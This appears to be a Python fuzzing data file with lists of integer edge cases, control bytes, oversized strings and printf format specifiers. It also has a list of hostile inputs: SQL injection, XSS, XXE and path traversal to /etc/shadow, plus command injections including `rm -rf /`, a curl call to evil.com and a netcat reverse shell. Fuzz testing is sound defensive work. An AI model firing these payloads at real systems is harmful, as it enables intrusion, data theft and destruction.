SPECIAL_INTS: list[int] = list({
    # 32-bit specific edge cases
    0xFFFFFFFF,  # Max unsigned 32-bit integer (2^32 - 1)
    0x7FFFFFFF,  # Max signed 32-bit integer (2^31 - 1)
    0x80000000,  # Min signed 32-bit integer (-2^31)

    # 64-bit specific edge cases
    0xFFFFFFFFFFFFFFFF,  # Max unsigned 64-bit integer (2^64 - 1)
    0x7FFFFFFFFFFFFFFF,  # Max signed 64-bit integer (2^63 - 1)
    0x8000000000000000,  # Min signed 64-bit integer (-2^63)
    # Edge case values
    0,  # Zero
    -1,  # Negative one
    1,  # Positive one

    # Large numbers near the limits of 32-bit integers
    0xFFFFFFFE,  # Just below UINT_MAX for 32-bit
    0x7FFFFFFE,  # Just below INT_MAX for 32-bit

    # Large numbers near the limits of 64-bit integers
    0xFFFFFFFFFFFFFFFE,  # Just below UINT_MAX for 64-bit
    0x7FFFFFFFFFFFFFFE,  # Just below INT_MAX for 64-bit

    # Powers of 2 for 32-bit integers
    *(2 ** i for i in range(1, 64)),

    # Negative powers of 2 for 32-bit integers
    *(-(2 ** i) for i in range(1, 64)),

    # Random special numbers
    314159265,  # Pi approximation
    271828182,  # e approximation
    42,  # The answer to life, universe, and everything
    1337,  # Hacker number
    9001,  # Over 9000!
})

# Define special character values as integers for boundary and edge case testing
SPECIAL_CHAR_INTS = list({0x00, 0xFF, 0x7F, 0x80})

# Define boundary values in string form for testing in text-based fields
BOUNDARY_CHAR_STRINGS = list({"\x00", "\xFF",
                              "\x7F", "\x80", "\x01", "\x02", "\x03",
                              "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0a",
                              "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10", "\x11",
                              "\x12", "\x13", "\x14", "\x15", "\x16", "\x17", "\x18",
                              "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e", "\x1f"

                              })

SPECIAL_POSITIVE_INTS = [i for i in SPECIAL_INTS if i > 0]
TRIVAL_POSITIVE_INTS = list({
    2 ** 16
})

INJECTION_PAYLOADS: list[bytes] = list({
    # SQL Injection-like Payloads
    b"'; DROP TABLE users; --",  # Simple SQL injection
    b"' OR '1'='1",  # Bypass authentication with tautology
    b"' UNION SELECT NULL, NULL, NULL --",  # SQL injection with UNION
    b"'; EXEC xp_cmdshell('dir'); --",  # SQL injection with command execution (SQL Server)

    # XSS Injection Payloads
    b"<script>alert('XSS')</script>",  # Basic XSS payload
    b"<img src=x onerror=alert(1)>",  # Image-based XSS
    b"<svg/onload=alert('XSS')>",  # SVG-based XSS
    b"<iframe src='javascript:alert(1)'></iframe>",  # iframe-based XSS
    b"' onmouseover='alert(1)",  # Inline attribute-based XSS

    # Command Injection Payloads
    b"|| ls -la ||",  # Command injection (Linux)
    b"`rm -rf /`",  # Command injection (Linux)
    b"$(curl http://evil.com)",  # Command injection with network call
    b"; ping -c 4 127.0.0.1;",  # Ping command to test for remote execution
    b"| nc -e /bin/sh 127.0.0.1 4444 |",  # Netcat reverse shell

    # Path Traversal Payloads
    b"../../etc/passwd",  # Path traversal to sensitive file
    b"..\\..\\windows\\system32\\drivers\\etc\\hosts",  # Windows path traversal
    b"/etc/shadow",  # Direct path to a sensitive file (Linux)
    b"C:\\boot.ini",  # Windows system file access
    b"/proc/self/environ",  # Linux environment variables access

    # XML-Specific and Encoded Payloads
    b"&#x27;",  # HTML entity encoding for single quote
    b"&lt;script&gt;alert('XSS')&lt;/script&gt;",  # Encoded XSS script
    b"<![CDATA[<script>alert('XSS')</script>]]>",  # CDATA XSS payload
    b"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    # XXE Payload
    b"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
    # XXE with sensitive file
    b"%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL-encoded XSS

    # Additional Obfuscation and Encoding
    b"%00%ff%fe",  # Null byte and binary data
    b"<!--#exec cmd=\"/bin/sh\"-->",  # Server-side include command execution
    b"&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",  # Hexadecimal encoded XSS
    b"\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # JavaScript-style hexadecimal escape sequences
    "中文测试".encode('utf-8'),  # Unicode characters to test encoding support
    "𠜎𠜱𠝹𠱓".encode('utf-8'),  # Extended Unicode characters to test UTF-8 support

})

BOUNDARY_VALUES = list({
    b"",
    b" ",  # Empty string
    b" " * 1024,  # Empty string
    b" " * 65536,  # Empty string
    b"A" * 1024,  # Large string to test buffer limits
    b"A" * 65536,  # Extremely large string for memory handling
    b"\x00",  # Null byte (often terminates strings in C-based languages)
    b"\xFF\xFE",  # Edge of ASCII/Unicode range, binary data
    b"\x00\xFF\xFE",  # Combination of binary edge values
    b" " * 1024,  # Large string of spaces
    b"A" * 10 ** 6,  # Extremely large string (1 million characters)
    b"-1",  # Negative number for numeric boundary tests
    b"0",  # Zero boundary value
    b"1",  # Smallest positive integer
    str(2 ** 31 - 1).encode('utf-8'),  # Max 32-bit integer
    str(2 ** 31).encode('utf-8'),  # Overflow 32-bit signed integer
    str(2 ** 63 - 1).encode('utf-8'),  # Max 64-bit integer
    str(2 ** 63).encode('utf-8'),  # Overflow 64-bit signed integer
    b"-2147483648",  # Minimum 32-bit integer
    b"-9223372036854775808",  # Minimum 64-bit integer
    b"9" * 308,  # Large floating-point number (close to float max)
    b"-9" * 308,  # Large negative floating-point number
    b"1e308",  # Exponentially large float (near limit of double)
    b"1e-308",  # Very small float (near limit of double precision)
    b"%20",  # URL encoded space
    b"%00%FF",  # URL encoded null and max byte
    "中文测试".encode('utf-8'),  # Unicode characters to test encoding support
    "𠜎𠜱𠝹𠱓".encode('utf-8'),  # Extended Unicode characters to test UTF-8 support
    b"!" * 512,  # Large string of special characters
    b"\\x00\\x01\\x02",  # Escaped hexadecimal characters
    b"<tag>value</tag>",  # XML-like structure to test XML injection
    b"DROP TABLE users;",  # SQL-like payload to test for injection handling
})

format_specifiers = list({
    b"%s",  # Outputs a string; tests string handling and buffer boundaries.
    b"%d",  # Outputs a signed integer; useful for numeric parsing and boundary testing.
    b"%x",  # Outputs a hexadecimal integer; reveals memory contents.
    b"%p",  # Outputs a pointer address in hex; tests for memory leak vulnerabilities.
    b"%n",
    b"%p %p %p",  # Multiple pointers; tests memory leak potential with several pointers in sequence.
    b"%s %s %s",  # Multiple pointers; tests memory leak potential with several pointers in sequence.
    b"%p %p %p" * 1024,  # Multiple pointers; tests memory leak potential with several pointers in sequence.
    b"%s %s %s" * 1024,  # Multiple pointers; tests memory leak potential with several pointers in sequence.
    b"%lln" * 1024,  # Writes 8 bytes to a memory address
    #
    # Writes the number of bytes written so far to a memory address; tests for arbitrary memory write vulnerabilities.
    b"%hhn",  # Writes 1 byte to a memory address; useful in testing byte-specific vulnerabilities.
    b"%hn",  # Writes 2 bytes to a memory address; partial overwrite vulnerabilities.
    b"%lld",  # Outputs a 64-bit long long integer; relevant for 64-bit integer handling in x86-64.
    b"%llx",  # Outputs a 64-bit long long integer in hex; useful for revealing pointer values on x86-64.
    b"%lx",  # Outputs a 32-bit long integer in hex; useful in mixed 32/64-bit environments.
    b"%lu",  # Outputs an unsigned long integer; used for unsigned boundary checks.
    b"%u",  # Outputs an unsigned integer; helps in testing unsigned integer boundaries.
    b"%f",  # Outputs a floating-point number; tests decimal and floating-point formatting.
    b"%e",  # Outputs a floating-point number in scientific notation; useful for precision testing.
    b"%g",
    # Outputs a floating-point number in compact format (scientific or decimal); tests for switching behavior.
    b"%#x",  # Hex with prefix (0x); useful to test for hex format edge cases.
    b"%o",  # Outputs an octal integer; tests for non-decimal numeral system handling.
    b"%c",  # Outputs a single character; tests ASCII and Unicode handling.
    b"%10.2f",  # Outputs a float with width 10, precision 2; tests width and precision control in floats.
    b"%020x",  # Zero-padded width for hex; useful for format parsing checks.
    b"%-100d",  # Left-aligned with large width; can reveal alignment handling issues.
    b"%.4096d",  # Integer with high precision, stresses the output buffer limits.
    b"%.*s",  # Dynamically specifies precision; tests handling of dynamic format controls.
    b"%1024c",  # Outputs 1024 characters; useful for buffer limit testing.
    b"%#100x",  # Hex with alternate form (0x) and specified width; tests complex formatting handling.
    b"%jX",  # Outputs a 64-bit integer in uppercase hex (POSIX); tests large integer formats.
    b"%+d",  # Signed integer with explicit sign; tests for sign handling.
    b"%ld",  # Long integer format; useful in cross-platform and cross-architecture fuzzing.
    b"%*d",  # Width specified as an argument; tests for width control and format parsing.
    b"%-#010x",  # Combined alignment, padding, prefix; complex format tests for vulnerabilities.
    b"%#08x",  # Hex with prefix and zero padding; useful in detailed formatting fuzzing.
    b"%*.*f",  # Dynamic width and precision for floats; tests floating-point parsing with dynamic arguments.
})

long_specs = list({
    b"%1000x",  # Large width, tests for buffer overflow
    b"%9999999s",  # Extremely large width, tests memory allocation issues
    b"%10$s",  # Parameter indexing, potential for memory leak
    b"%10000d",  # Large width integer format
    b"%2147483647d",  # Maximum 32-bit integer width, tests overflow
    b"%32767x",  # Maximum 16-bit signed integer width
    b"%65536s",  # 64KB string width, tests memory allocation limits
    b"%llu",  # Unsigned long long integer
    b"%020x",  # Zero-padded long width, tests format parsing
    b"%-100d",  # Left-aligned large width, may cause memory layout issues
    b"%.*s",  # Dynamic width control, tests format parsing robustness
    b"%999.999f",  # Extremely high-precision float
    b"%10.10x",  # Fixed width hex format, checks for stack overflow
    b"%1024c",  # Outputs 1024 characters, tests buffer limits
    b"%#100x",  # Width with prefix for hex formatting
    b"%.4096d",  # Large precision, tests float processing
    b"%10000000000d",  # Extremely large width integer, tests integer overflow
    b"%lld",  # Long integer format, useful for 64-bit systems
    b"%jx",  # Prints pointer-sized integer, common on POSIX systems
})
